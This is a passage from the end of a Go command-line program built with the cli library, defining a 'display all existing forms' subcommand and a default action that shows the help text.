					Usage: "display all existing forms",

					Action: func(c *cli.Context) error {

						err := connect(c)
						if err != nil {
							utils.Error.Println(err)
							cli.OsExiter(1)
						}
						err = displayForms(c)
						exit(err)
						return nil
					},
				},
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		cli.ShowAppHelp(c)
		return nil
	}

	app.Run(os.Args)

}
